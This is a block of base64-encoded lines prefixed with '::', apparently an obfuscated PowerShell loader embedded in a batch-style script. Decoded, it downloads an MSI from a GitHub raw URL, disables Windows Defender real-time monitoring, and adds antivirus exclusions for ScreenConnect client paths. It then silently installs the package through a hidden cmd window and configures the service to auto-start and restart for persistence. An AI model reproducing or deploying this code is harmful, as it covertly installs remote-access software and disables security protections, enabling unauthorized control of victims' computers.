::KSB7IHJldHVybiAkbXNpIH0NCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQ
::YXRoICRtc2kgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
::ICAgfQ0KICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgic2NfZ3J5eGFf
::ezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkNCiAg
::ICAjIEwzMTogZ2l0aHViLWRyb3AgRklSU1QgKHJhdyB3b3JrcyBldmVuIHdoZW4g
::dWkuZ3J5eGEuY29tIFRMUyBpcyBicm9rZW4pLg0KICAgICR1cmxzID0gQCgNCiAg
::ICAgICAgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRk
::eS9naXRodWItZHJvcC9tYWluL3BrZ19ncnl4YS5tc2knLA0KICAgICAgICAkc2Ny
::aXB0OkdyeXhhTXNpVXJsDQogICAgKQ0KICAgICRjdXJsID0gSm9pbi1QYXRoICRl
::bnY6U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnDQogICAgaWYgKC1ub3Qg
::KFRlc3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0NCiAgICBm
::b3JlYWNoICgkdSBpbiAkdXJscykgew0KICAgICAgICB0cnkgew0KICAgICAgICAg
::ICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAmICRjdXJsIC1MIC0t
::c3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMw
::MCAtbyAkdG1wICR1IDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgaWYgKChU
::ZXN0LVBhdGggJHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0aCAtZ3Qg
::MTAwMDAwMCkpIHsNCiAgICAgICAgICAgICAgICAkZXhwID0gaWYgKCRzY3JpcHQ6
::R3J5eGFFeHBlY3RlZEZwKSB7ICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwIH0gZWxz
::ZSB7ICcnIH0NCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Nc2lQYWNr
::YWdlICR0bXAgJGV4cCkpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgICAgIHRy
::eSB7IENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRGVzdGluYXRpb24gJG1z
::aSAtRm9yY2UgLUVycm9yQWN0aW9uIFN0b3A7IHJldHVybiAkbXNpIH0gY2F0Y2gg
::eyByZXR1cm4gJHRtcCB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2gg
::e30NCiAgICB9DQogICAgaWYgKFRlc3QtUGF0aCAkdG1wKSB7IFJlbW92ZS1JdGVt
::IC1MaXRlcmFsUGF0aCAkdG1wIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZSB9DQogICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0aW9uIEFkZC1T
::Y0RlZmVuZGVyRXhjbHVzaW9uKFtzdHJpbmddJEZwKSB7DQogICAgIyBFeGNsdWRl
::IHRoaXMgRlAncyBTQyBkaXJzICh3aWxkY2FyZCArIGV4cGxpY2l0KSBzbyBSVE0g
::Y2FuJ3QgcXVhcmFudGluZSB0aGUNCiAgICAjIGNsaWVudCBvbiBpbnN0YWxsLiBS
::ZS1hc3NlcnRlZCBiZWZvcmUgZXZlcnkgaW5zdGFsbC9taWdyYXRlIOKAlCBzdXJ2
::aXZlcyBGUCByb3RhdGlvbnMuDQogICAgdHJ5IHsNCiAgICAgICAgJG5hbWVzID0g
::QCgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGcCkiLCAnU2NyZWVuQ29ubmVjdCBD
::bGllbnQqJykNCiAgICAgICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICAg
::ICAgaWYgKC1ub3QgJGJhc2UpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgZm9y
::ZWFjaCAoJG4gaW4gJG5hbWVzKSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
::blBhdGggKEpvaW4tUGF0aCAkYmFzZSAkbikgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfQ0KICAgICAgICB9DQogICAgICAgIEFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvblByb2Nlc3MgJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5l
::eGUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIEFkZC1N
::cFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJ1NjcmVlbkNvbm5lY3QuV2lu
::ZG93c0NsaWVudC5leGUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
::ICAgICAgIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3Jp
::bmcgJHRydWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9IGNh
::dGNoIHt9DQp9DQoNCmZ1bmN0aW9uIENvbnZlcnRUby1QYWNrZWRHdWlkKFtzdHJp
::bmddJEd1aWQpIHsNCiAgICAjIFdpbmRvd3MgSW5zdGFsbGVyIHN0b3JlcyBQcm9k
::dWN0Q29kZXMgd2l0aCByZXZlcnNlZCBzZWdtZW50cyAocGFja2VkL3NxdWlzaGVk
::IEdVSUQpLg0KICAgICRnID0gJEd1aWQuVHJpbSgne30nKS5SZXBsYWNlKCctJywg
::JycpDQogICAgJHNiID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWls
::ZGVyDQogICAgIyBmaXJzdCAzIHNlZ21lbnRzIHJldmVyc2VkIHBlci1jaGFyLCBs
::YXN0IDIgc2VnbWVudHMgcmV2ZXJzZWQgcGVyLWJ5dGUtcGFpcg0KICAgICRzZWdz
::ID0gQCgkZy5TdWJzdHJpbmcoMCw4KSwgJGcuU3Vic3RyaW5nKDgsNCksICRnLlN1
::YnN0cmluZygxMiw0KSwgJGcuU3Vic3RyaW5nKDE2LDQpLCAkZy5TdWJzdHJpbmco
::MjAsMTIpKQ0KICAgIGZvciAoJGk9MDsgJGkgLWx0IDM7ICRpKyspIHsgJGMgPSAk
::c2Vnc1skaV0uVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkYyk7IFt2
::b2lkXSRzYi5BcHBlbmQoLWpvaW4gJGMpIH0NCiAgICBmb3IgKCRpPTM7ICRpIC1s
::dCA1OyAkaSsrKSB7ICRzID0gJHNlZ3NbJGldOyBmb3IgKCRqPTA7ICRqIC1sdCAk
::cy5MZW5ndGg7ICRqKz0yKSB7IFt2b2lkXSRzYi5BcHBlbmQoJHNbJGorMV0pOyBb
::dm9pZF0kc2IuQXBwZW5kKCRzWyRqXSkgfSB9DQogICAgcmV0dXJuICRzYi5Ub1N0
::cmluZygpLlRvVXBwZXIoKQ0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtSW5zdGFsbGVy
::UHJvZHVjdFJlZ2lzdHJhdGlvbihbc3RyaW5nXSRQcm9kdWN0Q29kZSkgew0KICAg
::ICMgUHVyZ2UgYSBwaGFudG9tL2NvcnJ1cHQgUHJvZHVjdENvZGUgZnJvbSB0aGUg
::SW5zdGFsbGVyIGRhdGFiYXNlIChJbnN0YWxsZWQ9MDA6MDA6MDANCiAgICAjIHJl
::Z2lzdHJhdGlvbnMgdGhhdCBzdXJ2aXZlIEFSUCByZW1vdmFsIGFuZCBtYWtlIC9p
::IGZhaWwgMTYwMyBpbiBtYWludGVuYW5jZSBtb2RlKS4NCiAgICBpZiAoLW5vdCAk
::UHJvZHVjdENvZGUpIHsgcmV0dXJuIH0NCiAgICAkcGFja2VkID0gQ29udmVydFRv
::LVBhY2tlZEd1aWQgJFByb2R1Y3RDb2RlDQogICAgJGtleXMgPSBAKA0KICAgICAg
::ICAiSEtMTTpcU09GVFdBUkVcQ2xhc3Nlc1xJbnN0YWxsZXJcUHJvZHVjdHNcJHBh
::Y2tlZCIsDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::c1xDdXJyZW50VmVyc2lvblxJbnN0YWxsZXJcVXNlckRhdGFcUy0xLTUtMThcUHJv
::ZHVjdHNcJHBhY2tlZCIsDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcJFByb2R1Y3RDb2Rl
::IiwNCiAgICAgICAgIkhLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29m
::dFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwkUHJvZHVjdENvZGUi
::DQogICAgKQ0KICAgIGZvcmVhY2ggKCRrIGluICRrZXlzKSB7DQogICAgICAgIGlm
::IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRrKSB7IFJlbW92ZS1JdGVtIC1MaXRl
::cmFsUGF0aCAkayAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfQ0KICAgIH0NCiAgICAmIHJlZy5leGUgZGVsZXRlICJIS0NSXElu
::c3RhbGxlclxQcm9kdWN0c1wkcGFja2VkIiAvZiAyPiYxIHwgT3V0LU51bGwNCn0N
::Cg0KZnVuY3Rpb24gU3RhcnQtR3J5eGFJbnN0YWxsKFtzdHJpbmddJE1zaVBhdGgs
::IFtzdHJpbmddJEZwLCBbc3RyaW5nXSRMb2dGaWxlKSB7DQogICAgIyBMNDQ6IG5l
::dmVyIGludGVycnVwdCBhbnkgbGl2ZSBHcnl4YTsgbmV2ZXIgL2kgd2hpbGUgdGhp
::cyBGUCdzIHNlcnZpY2UgZXhpc3RzOyBuZXZlciBkZWZlcnJlZCAveC4NCiAgICBp
::ZiAoRmluZC1SdW5uaW5nR3J5eGFGcCkgeyByZXR1cm4gfQ0KICAgIGlmICgkRnAg
::LWFuZCAoVGVzdC1TY1J1bm5pbmcgJEZwKSkgeyByZXR1cm4gfQ0KICAgIGlmICgk
::RnAgLWFuZCAoVGVzdC1TY1NlcnZpY2VFeGlzdHMgJEZwKSkgew0KICAgICAgICAk
::bmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZwKSINCiAgICAgICAgJiBz
::Yy5leGUgY29uZmlnICRuYW1lIHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbA0K
::ICAgICAgICAmIHNjLmV4ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0LU51bGwNCiAg
::ICAgICAgcmV0dXJuDQogICAgfQ0KICAgIEFkZC1TY0RlZmVuZGVyRXhjbHVzaW9u
::ICRGcA0KICAgICRzYWZlTXNpID0gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZSAkTXNp
::UGF0aA0KICAgIGlmICgtbm90ICRzYWZlTXNpKSB7IHJldHVybiB9ICAjIHJlZnVz
::ZSBpbnN0YWxsIGlmIFVwZ3JhZGUgY2Fubm90IGJlIGNsZWFyZWQNCiAgICAkcGMg
::PSBHZXQtTXNpUHJvcGVydHkgJHNhZmVNc2kgJ1Byb2R1Y3RDb2RlJw0KICAgICRj
::bWQgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX2luc3RhbGwuY21kJw0KICAg
::ICRzdmNOYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRnApIg0KICAgICRs
::aW5lcyA9IEAoJ0BlY2hvIG9mZicpDQogICAgJGxpbmVzICs9ICdyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEn
::DQogICAgIyBMNDQgcnVudGltZSBndWFyZCBpbiBkZWZlcnJlZCBjbWQg4oCUIGFi
::b3J0IGlmIEdyeXhhIGFwcGVhcmVkIHNpbmNlIHdyYXBwZXIgd2FzIHdyaXR0ZW4N
::CiAgICAkbGluZXMgKz0gInNjIHF1ZXJ5IGAiJHN2Y05hbWVgIiA+bnVsIDI+JjEi
::DQogICAgJGxpbmVzICs9ICdpZiBub3QgZXJyb3JsZXZlbCAxIChzYyBzdGFydCAi
::JyArICRzdmNOYW1lICsgJyIgPm51bCAyPiYxICYgZXhpdCAvYiAwKScNCiAgICAk
::bGluZXMgKz0gJ3NjIHF1ZXJ5IHN0YXRlPSBhbGwgfCBmaW5kc3RyIC9JIC9DOiIn
::ICsgJEZwICsgJyIgPm51bCcNCiAgICAkbGluZXMgKz0gJ2lmIG5vdCBlcnJvcmxl
::dmVsIDEgZXhpdCAvYiAwJw0KICAgICMgbm8gbXNpZXhlYyAveCBldmVyIGluIGRl
::ZmVycmVkIHdyYXBwZXIgKFRPQ1RPVSBraWxsZWQgbGl2ZSBHdWVzdCkNCiAgICBp
::ZiAoJHBjKSB7DQogICAgICAgICRsaW5lcyArPSAicmVnIGRlbGV0ZSBgIkhLTE1c
::U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0
::YWxsXCRwY2AiIC9mID5udWwgMj4mMSINCiAgICAgICAgJGxpbmVzICs9ICJyZWcg
::ZGVsZXRlIGAiSEtMTVxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2lu
::ZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcJHBjYCIgL2YgPm51bCAyPiYx
::Ig0KICAgIH0NCiAgICAkbGluZXMgKz0gIm1zaWV4ZWMgL2kgYCIkc2FmZU1zaWAi
::IC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNz
::IC9MKnYgYCIkTG9nRmlsZWAiIg0KICAgICRsaW5lcyArPSAic2MgY29uZmlnIGAi
::JHN2Y05hbWVgIiBzdGFydD0gYXV0byINCiAgICAkbGluZXMgKz0gInNjIGZhaWx1
::cmUgYCIkc3ZjTmFtZWAiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMw
::MDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCINCiAgICAkbGluZXMgKz0gInNj
::IHN0YXJ0IGAiJHN2Y05hbWVgIiINCiAgICBmb3JlYWNoICgkc2sgaW4gKEdldC1T
::ZXZyektlZXApKSB7DQogICAgICAgICRsaW5lcyArPSAic2MgY29uZmlnIGAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCRzaylgIiBzdGFydD0gYXV0byA+bnVsIDI+JjEi
::DQogICAgICAgICRsaW5lcyArPSAic2Mgc3RhcnQgYCJTY3JlZW5Db25uZWN0IENs
::aWVudCAoJHNrKWAiID5udWwgMj4mMSINCiAgICB9DQogICAgJHJlc3VsdEZpbGUg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX2luc3RhbGwucmVzdWx0Jw0KICAg
::ICRsaW5lcyArPSAiZWNobyAlRVJST1JMRVZFTCU+YCIkcmVzdWx0RmlsZWAiIg0K
::ICAgICRsaW5lcyArPSAiZGVsIC9mIC9xIGAiJHNhZmVNc2lgIiA+bnVsIDI+JjEi
::DQogICAgJGxpbmVzICs9ICJkZWwgL2YgL3EgYCIkY21kYCIgPm51bCAyPiYxIg0K
::ICAgICRsaW5lcyArPSAnZXhpdCcNCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBh
::dGggJGNtZCAtVmFsdWUgJGxpbmVzIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCiAg
::ICBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50TGlzdCAiL2MgYCIkY21k
::YCIiIC1XaW5kb3dTdHlsZSBIaWRkZW4NCn0NCg0KZnVuY3Rpb24gTWFyay1Hcnl4
::YVJlaW5zdGFsbCB7DQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2lu
::LVBhdGggJFdvcmtEaXIgJ2dyeXhhX3JlaW5zdGFsbC5mbGFnJykgLVZhbHVlIChH
::ZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSAtRW5jb2Rp
::bmcgQVNDSUkgLUZvcmNlDQp9DQoNCmZ1bmN0aW9uIEdldC1Hcnl4YU1pZ3JhdGVP
::bGRQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9taWdyYXRlX29sZC50
::eHQnIH0NCg0KZnVuY3Rpb24gU2F2ZS1Hcnl4YU1pZ3JhdGVPbGQoW3N0cmluZ1td
::XSRPbGRGcHMsIFtzdHJpbmddJE5ld0ZwKSB7DQogICAgJG9sZHMgPSBAKCRPbGRG
::cHMgfCBXaGVyZS1PYmplY3QgeyAkXyAtYW5kICgkXyAtbmUgJE5ld0ZwKSB9IHwg
::U2VsZWN0LU9iamVjdCAtVW5pcXVlKQ0KICAgIGlmICgtbm90ICRvbGRzLkNvdW50
::KSB7DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAoR2V0LUdyeXhh
::TWlncmF0ZU9sZFBhdGgpIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgU2V0LUNvbnRlbnQgLUxp
::dGVyYWxQYXRoIChHZXQtR3J5eGFNaWdyYXRlT2xkUGF0aCkgLVZhbHVlICRvbGRz
::IC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCn0NCg0KZnVuY3Rpb24gQ29tcGxldGUt
::R3J5eGFNaWdyYXRlT2xkIHsNCiAgICAjIEw0NDogTkVWRVIgYXV0by11bmluc3Rh
::bGwgb2xkIEdyeXhhIEZQIOKAlCB0aGF0IGRyb3BwZWQgbGl2ZSBHdWVzdHMgc3Rp
::bGwgb24gb2xkIEZQLg0KICAgICMgS2VlcCB0aGUgZmxhZyBmb3IgdmlzaWJpbGl0
::eTsgb3BlcmF0b3IvbWFudWFsIGNsZWFudXAgb25seS4NCiAgICAkcCA9IEdldC1H
::cnl4YU1pZ3JhdGVPbGRQYXRoDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJHApKSB7IHJldHVybiB9DQogICAgJGxvZyA9IEpvaW4tUGF0aCAk
::V29ya0RpciAnZ3J5eGFfZW5zdXJlLmxvZycNCiAgICBBZGQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCd7MH0gbWlncmF0ZV9jbGVhbnVwX1NLSVBQ
::RURfTDQ0IChrZWVwIGR1YWwtRlA7IG5ldmVyIC94IGxpdmUgR3J5eGEpJyAtZiAo
::R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpKSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFs
::UGF0aCAkcCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCn0N
::Cg0KZnVuY3Rpb24gU3RhcnQtR3J5eGFNaWdyYXRlKFtzdHJpbmddJE1zaVBhdGgs
::IFtzdHJpbmddJE5ld0ZwLCBbc3RyaW5nW11dJE9sZEZwcywgW3N0cmluZ10kUmVh
::c29uKSB7DQogICAgIyBMNDI6IHNpYmxpbmctc2FmZSAvaSBvZiBOZXdGcCBGSVJT
::VCDigJQga2VlcCBPbGRGcHMgUnVubmluZyB1bnRpbCBDb21wbGV0ZS1Hcnl4YU1p
::Z3JhdGVPbGQuDQogICAgU2F2ZS1Hcnl4YU1pZ3JhdGVPbGQgJE9sZEZwcyAkTmV3
::RnANCiAgICBDbGVhci1Hcnl4YUFycCAkTmV3RnANCiAgICBTZXQtR3J5eGFGcCAk
::TmV3RnANCiAgICBTdGFydC1Hcnl4YUluc3RhbGwgJE1zaVBhdGggJE5ld0ZwIChK
::b2luLVBhdGggJFdvcmtEaXIgJ21zaV9ncnl4YV9kZXRhY2hlZC5sb2cnKQ0KICAg
::IE1hcmstR3J5eGFSZWluc3RhbGwNCiAgICByZXR1cm4gIklORkxJR0hUfCROZXdG
::cHwkUmVhc29uIg0KfQ0KDQpmdW5jdGlvbiBJbnZva2UtR3J5eGFFbnN1cmUgew0K
::ICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRXb3JrRGlyKSkg
::eyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1G
::b3JjZSB8IE91dC1OdWxsIH0NCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGly
::ICdncnl4YV9lbnN1cmUubG9nJw0KICAgIGZ1bmN0aW9uIEdMb2coW3N0cmluZ10k
::bSkgeyBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCd7MH0g
::ezF9JyAtZiAoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycp
::LCAkbSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KDQogICAgQ29t
::cGxldGUtR3J5eGFNaWdyYXRlT2xkDQoNCiAgICAkaW5zdGFsbENtZCA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnZ3J5eGFfaW5zdGFsbC5jbWQnDQogICAgIyBMMzI6IG9u
::bHkgaG9ub3IgdGhlIHNpbmdsZS1mbGlnaHQgbG9jayBpZiBtc2lleGVjIGlzIEFD
::VFVBTExZIHJ1bm5pbmcuDQogICAgaWYgKChUZXN0LVBhdGggJGluc3RhbGxDbWQp
::IC1hbmQgKCgoR2V0LURhdGUpIC0gKEdldC1JdGVtICRpbnN0YWxsQ21kKS5MYXN0
::V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDE1KSkgew0KICAgICAgICAkbXNp
::UnVubmluZyA9IFtib29sXShHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAt
::RmlsdGVyICJOYW1lPSdtc2lleGVjLmV4ZSciIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkNvbW1h
::bmRMaW5lIC1tYXRjaCAnZ3J5eGF8cGtnX2dyeXhhfFNjcmVlbkNvbm5lY3QnIH0p
::DQogICAgICAgIGlmICgkbXNpUnVubmluZykgeyBHTG9nICdpbmZsaWdodF9pbnN0
::YWxsJzsgcmV0dXJuICJJTkZMSUdIVHwkKEdldC1Hcnl4YUZwKXxpbmZsaWdodD0x
::IiB9DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkaW5zdGFsbENt
::ZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAg
::R0xvZyAnc3RhbGVfaW5zdGFsbF93cmFwcGVyX2NsZWFyZWQnDQogICAgfQ0KDQog
::ICAgJGZwID0gR2V0LUdyeXhhRnANCiAgICAkZXhwID0gJHNjcmlwdDpHcnl4YUV4
::cGVjdGVkRnANCiAgICBpZiAoLW5vdCAkZXhwKSB7ICRleHAgPSAkZnAgfQ0KDQog
::ICAgIyBMNDQgLUZvcmNlIC8gZnBfZHJpZnQ6IEFOWSBsaXZlIEdyeXhhID0gSEVB
::TFRIWS4gTmV2ZXIgbWlncmF0ZS91bmluc3RhbGwgd2hpbGUgY29ubmVjdGVkLg0K
::ICAgIGlmICgkRm9yY2UpIHsNCiAgICAgICAgJHJ1bm5pbmdGb3JjZSA9IEZpbmQt
::UnVubmluZ0dyeXhhRnANCiAgICAgICAgaWYgKCRydW5uaW5nRm9yY2UpIHsNCiAg
::ICAgICAgICAgIFNldC1Hcnl4YUZwICRydW5uaW5nRm9yY2UNCiAgICAgICAgICAg
::IEdMb2cgImZvcmNlX3NraXBfYW55X2xpdmVfZ3J5eGEgZnA9JHJ1bm5pbmdGb3Jj
::ZSINCiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZvcmNlfHJ1
::bm5pbmc9MXxmb3JjZS1za2lwcGVkPTEiDQogICAgICAgIH0NCiAgICAgICAgR0xv
::ZyAiZm9yY2VfZW5zdXJlIHRhcmdldD0kZXhwIHJ1bm5pbmc9bm9uZSINCiAgICAg
::ICAgJG1zaSA9IEdldC1Hcnl4YU1zaQ0KICAgICAgICBpZiAoLW5vdCAkbXNpKSB7
::IEdMb2cgJ21zaV91bmF2YWlsYWJsZSc7IHJldHVybiAiVU5IRUFMVEhZfCRleHB8
::bXNpLXVuYXZhaWxhYmxlIiB9DQogICAgICAgICRuZXdGcCA9IEdldC1GcEZyb21Q
::cm9kdWN0TmFtZSAoR2V0LU1zaVByb3BlcnR5ICRtc2kgJ1Byb2R1Y3ROYW1lJykN
::CiAgICAgICAgaWYgKC1ub3QgJG5ld0ZwKSB7ICRuZXdGcCA9ICRleHAgfQ0KICAg
::ICAgICBTZXQtR3J5eGFGcCAkbmV3RnANCiAgICAgICAgU3RhcnQtR3J5eGFJbnN0
::YWxsICRtc2kgJG5ld0ZwIChKb2luLVBhdGggJFdvcmtEaXIgJ21zaV9ncnl4YV9k
::ZXRhY2hlZC5sb2cnKQ0KICAgICAgICBNYXJrLUdyeXhhUmVpbnN0YWxsDQogICAg
::ICAgIHJldHVybiAiSU5GTElHSFR8JG5ld0ZwfGZvcmNlLXNwYXduZWQ9MSINCiAg
::ICB9DQoNCiAgICAjIEw0NDogaWYgYW55IEdyeXhhIGlzIFJ1bm5pbmcsIGFkb3B0
::IGl0IOKAlCBkbyBOT1QgbWlncmF0ZSB0byBFeHBlY3RlZEZwIChkcm9wcyBHdWVz
::dCkNCiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsNCiAgICAgICAg
::JHJ1bm5pbmdGcDAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwDQogICAgICAgIGlmICgk
::cnVubmluZ0ZwMCkgew0KICAgICAgICAgICAgaWYgKCRydW5uaW5nRnAwIC1uZSAk
::ZXhwIC1vciAkZnAgLW5lICRleHApIHsNCiAgICAgICAgICAgICAgICBTZXQtR3J5
::eGFGcCAkcnVubmluZ0ZwMA0KICAgICAgICAgICAgICAgIEdMb2cgImZwX2RyaWZ0
::X2Fkb3B0X2xpdmUga2VlcD0kcnVubmluZ0ZwMCBleHBlY3RlZD0kZXhwIChubyBt
::aWdyYXRlKSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkRGVlcCkg
::ew0KICAgICAgICAgICAgICAgICR0Y3BSID0gVGVzdC1UY3BIb3N0UG9ydCAkc2Ny
::aXB0OkdyeXhhUmVsYXlIb3N0IDQ0Mw0KICAgICAgICAgICAgICAgICR0Y3BVID0g
::VGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0Mw0KICAgICAg
::ICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwMHxydW5uaW5nPTF8
::ZGVlcD0xfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVfGFkb3B0ZWQ9MSINCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwMHxy
::dW5uaW5nPTF8YWRvcHRlZD0xIg0KICAgICAgICB9DQogICAgICAgIGlmICgkZnAg
::LW5lICRleHApIHsNCiAgICAgICAgICAgIEdMb2cgImZwX2RyaWZ0X2NmZ19vbmx5
::IGN1cnJlbnQ9JGZwIGV4cGVjdGVkPSRleHAgKG5vIGxpdmUgZ3J5eGEpIg0KICAg
::ICAgICAgICAgU2V0LUdyeXhhRnAgJGV4cA0KICAgICAgICAgICAgJGZwID0gJGV4
::cA0KICAgICAgICB9DQogICAgfQ0KDQogICAgJHJ1bm5pbmdGcCA9IEZpbmQtUnVu
::bmluZ0dyeXhhRnANCiAgICBpZiAoJHJ1bm5pbmdGcCkgew0KICAgICAgICBTZXQt
::R3J5eGFGcCAkcnVubmluZ0ZwDQogICAgICAgICMgTDM5IC1EZWVwOiBUQ1AvcmVs
::YXkgYWR2aXNvcnk7IGRvIE5PVCByZWluc3RhbGwgc29sZWx5IG9uIFRDUCBmYWls
::IChsZWFybmVkIHRoYXQgbGVzc29uKQ0KICAgICAgICBpZiAoJERlZXApIHsNCiAg
::ICAgICAgICAgICR0Y3BSID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhh
::UmVsYXlIb3N0IDQ0Mw0KICAgICAgICAgICAgJHRjcFUgPSBUZXN0LVRjcEhvc3RQ
::b3J0ICRzY3JpcHQ6R3J5eGFVaUhvc3QgNDQzDQogICAgICAgICAgICBHTG9nICJk
